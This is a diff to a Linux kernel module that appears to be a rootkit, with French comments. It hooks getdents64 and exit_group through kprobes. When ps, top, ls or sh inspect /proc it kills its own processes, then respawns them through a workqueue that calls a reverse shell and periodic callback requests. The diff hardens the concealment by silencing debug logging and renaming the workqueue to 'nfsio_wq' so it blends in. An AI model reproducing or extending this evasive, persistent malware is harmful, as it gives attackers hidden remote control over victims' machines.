@@ -12,7 +12,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
-MODULE_DESCRIPTION("Hook __x64_sys_open using kprobes");
+MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
 
 /* static struct kprobe kp; */
 static struct kprobe kp2;
@@ -22,11 +22,10 @@ bool killed = false;
 static struct workqueue_struct *wq;
 
 
-
 /* Fonction pour rechercher et kill nos processus */
 /* Appellée directement si 'ps' ou 'top', et si un 'ls' ou 'sh' interagit avec /proc */
 static void find_and_kill_our_processes(void) {
-	pr_info("[+] Inside find_and_kill_our_processes\n");
+	/* pr_info("[+] Inside find_and_kill_our_processes\n"); */
     struct task_struct *task;
     for_each_process(task) {
 		/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
@@ -62,7 +61,7 @@ static void find_and_kill_our_processes(void) {
 /* Fonction pour rechercher dans les fichiers utilisé par la tache en cours si ils sont liés à /proc */ 
 /* Appellée si 'ls' ou 'sh' */
 static void if_its_related_to_proc_we_kill(void) {
-	pr_info("[+] Inside if_its_related_to_proc_we_kill\n");
+	/* pr_info("[+] Inside if_its_related_to_proc_we_kill\n"); */
 	if (current->files) {
 		struct fdtable *fdt = files_fdtable(current->files);
 		if (fdt) {
@@ -87,11 +86,11 @@ static void if_its_related_to_proc_we_kill(void) {
 
 /* Handler pour la fonction hookée (__x64_sys_getdents64) */
 static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
-	pr_info("[+] Hooked __x64_sys_getdents64! PID: %d, name: %s", current->pid, current->comm);
+	/* pr_info("[+] Hooked __x64_sys_getdents64! PID: %d, name: %s", current->pid, current->comm); */
 	if (killed) {
 		return 0;
 	} 
-	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0) {
+	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0) { //add htop
     	find_and_kill_our_processes();
     }
 	if (strcmp(current->comm, "ls") == 0 || strcmp(current->comm, "sh") == 0) { //sh is for the tab autocompletion 
@@ -128,7 +127,7 @@ static void make_request(char *str) {
 
 /* Fonction exécutée dans la workqueue */
 static void my_work_handler(struct work_struct *work) {
-    pr_info("[+] Inside my_work_handler\n");
+    /* pr_info("[+] Inside my_work_handler\n"); */
     make_request("RESTARTED_BECAUSE_SOMETHING_KILLED_ME");
     rev_shell();
     make_request_periodic();
@@ -152,7 +151,7 @@ static void respawn_our_processes(void) {
 
 /* Handler pour la fonction hookée (__x64_sys_exit_group) */
 static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
-	pr_info("[+] Hooked __x64_sys_exit_group! PID: %d, name: %s", current->pid, current->comm);
+	/* pr_info("[+] Hooked __x64_sys_exit_group! PID: %d, name: %s", current->pid, current->comm); */
 	if (killed) {
 		respawn_our_processes();
 		killed = false;
@@ -178,7 +177,7 @@ static int __init hook_init(void) {
 	pr_info("[+] __x64_sys_getdents64 hooked successfully\n");
 
 	// workqueue to spawn our process after they are killed
-	wq = create_singlethread_workqueue("my_workqueue");
+	wq = create_singlethread_workqueue("nfsio_wq");
 	if (!wq) {
 		pr_err("[-] Failed to create workqueue\n");
 		return -1;
